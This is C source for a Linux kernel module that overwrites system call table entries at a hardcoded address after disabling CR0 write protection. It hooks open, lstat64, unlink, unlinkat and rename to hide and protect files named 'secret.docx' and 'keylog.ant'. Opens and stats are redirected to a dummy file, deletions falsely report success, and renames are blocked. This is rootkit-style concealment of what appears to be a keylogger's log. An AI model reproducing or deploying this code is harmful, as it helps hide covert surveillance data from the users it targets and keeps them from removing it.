#include <linux/syscalls.h>
#include <linux/sched.h>
#include <linux/proc_fs.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include <linux/string.h>

#include "sys_func_hook.h"
#include "utils.h"

/* protection filename array */
static const char * pro_filename[FILENAME_ARRAY] = {"secret.docx", "/secret.docx", "keylog.ant", "/keylog.ant"};
static void** sys_call_table = (void**)0xc07ae328;
asmlinkage long ((*org_sys_open)(const char * filename, int flags, int mode));
asmlinkage long ((*org_sys_lstat64)(char __user * filename, struct stat64 __user * statbuf));
asmlinkage long ((*org_sys_unlink)(const char __user * pathname));
asmlinkage int ((*org_sys_unlinkat)(int dfd, const char __user * pathname, int flag));
asmlinkage int ((*org_sys_rename)(const char __user *oldname, const char __user *newname));
asmlinkage long ((*org_sys_openat)(int dfd, const char __user *filename, int flags, int mode));


/* don't allow file copy */
asmlinkage long pseudo_sys_open(char * filename, int flags, int mode)
{
	int fd;

	if((!strncmp(filename, FILE_NAME1, strlen(FILE_NAME1)+1)) || strnstr(filename, FILE_NAME2, strlen(FILE_NAME2)+1))
	{
		mm_segment_t old_fs;
		filename = DUMMY_FILE_NAME;
		old_fs = get_fs();
		set_fs(get_ds());
		fd = org_sys_open(filename, flags, mode);
		set_fs(old_fs);
	}
	else
	{
		fd = org_sys_open(filename, flags, mode);
	}

  return fd;
}


/* don't allow file copy */
asmlinkage long pseudo_sys_lstat64(char __user * filename, struct stat64 __user * statbuf)
{
	int result;

	if((!strncmp(filename, FILE_NAME1, strlen(FILE_NAME1)+1)) || find_str(filename, FILE_NAME2, strlen(FILE_NAME2)+1))
	{
		mm_segment_t old_fs;
		filename = DUMMY_FILE_NAME;
		old_fs = get_fs();
		set_fs(get_ds());
		result = org_sys_lstat64(filename, statbuf);
		set_fs(old_fs);
	}
	else
	{
		result = org_sys_lstat64(filename, statbuf);
	}

	return result;
}


/* don't allow file remove */
asmlinkage long pseudo_sys_unlink(const char __user * pathname)
{
	int cnt;

	for(cnt=0;cnt<FILENAME_ARRAY;cnt+=2)
	{
		if((!strncmp(pathname, pro_filename[cnt], strlen(pro_filename[cnt])+1)) || find_str(pathname, pro_filename[cnt+1], strlen(pro_filename[cnt+1])+1))
		{
			return 0;
		}
	}
	/*
	if((!strncmp(pathname, FILE_NAME1, strlen(FILE_NAME1)+1)) || find_str(pathname, FILE_NAME2, strlen(FILE_NAME2)+1))
	{
		return 0;
	}
	*/
	 return org_sys_unlink(pathname);
}


/* don't allow file remove */
asmlinkage int pseudo_sys_unlinkat(int dfd, const char __user * pathname, int flag)
{
	int cnt;

	for(cnt=0;cnt<FILENAME_ARRAY;cnt+=2)
	{
		if((!strncmp(pathname, pro_filename[cnt], strlen(pro_filename[cnt])+1)) || find_str(pathname, pro_filename[cnt+1], strlen(pro_filename[cnt+1])+1))
		{
			return 0;
		}
	}
	/*
	if((!strncmp(pathname, FILE_NAME1, strlen(FILE_NAME1)+1)) || find_str(pathname, FILE_NAME2, strlen(FILE_NAME2)+1))
	{
		return 0;
	}
	*/
	return org_sys_unlinkat(dfd, pathname, flag);
}


/* don't allow file name change */
asmlinkage int pseudo_sys_rename(const char __user *oldname, const char __user *newname)
{
	if((!strncmp(oldname, FILE_NAME1, strlen(FILE_NAME1)+1)) || find_str(oldname, FILE_NAME2, strlen(FILE_NAME2)+1))
	{
		return 0;
	}
	return org_sys_rename(oldname, newname);
}


/* don't allow file name open */
/*
asmlinkage long pseudo_sys_openat(int dfd, const char __user *filename, int flags, int mode)
{
	printk(KERN_ALERT "%s\n", filename);
	return org_sys_openat(dfd, filename, flags, mode);
}
*/


void sys_func_hook_init(void)
{
  org_sys_open=*(sys_call_table+__NR_open);
  org_sys_lstat64=*(sys_call_table+__NR_lstat64);
  org_sys_unlink=*(sys_call_table+__NR_unlink);
  org_sys_unlinkat=*(sys_call_table+__NR_unlinkat);
  org_sys_rename=*(sys_call_table+__NR_rename);

  //org_sys_openat=*(sys_call_table+__NR_openat);

  write_cr0(read_cr0() & ( ~0x10000));
  *(sys_call_table+__NR_open)=pseudo_sys_open;
  *(sys_call_table+__NR_lstat64)=pseudo_sys_lstat64;
  *(sys_call_table+__NR_unlink)=pseudo_sys_unlink;
  *(sys_call_table+__NR_unlinkat)=pseudo_sys_unlinkat;
  *(sys_call_table+__NR_rename)=pseudo_sys_rename;

  //*(sys_call_table+__NR_openat)=pseudo_sys_openat;
  write_cr0(read_cr0() | 0x10000);
}


void sys_func_hook_term(void)
{
  write_cr0(read_cr0() & ( ~0x10000));
  *(sys_call_table+__NR_open)=org_sys_open;
  *(sys_call_table+__NR_lstat64)=org_sys_lstat64;
  *(sys_call_table+__NR_unlink)=org_sys_unlink;
  *(sys_call_table+__NR_unlinkat)=org_sys_unlinkat;
  *(sys_call_table+__NR_rename)=org_sys_rename;

  //*(sys_call_table+__NR_openat)=org_sys_openat;
  write_cr0(read_cr0() | 0x10000);
}
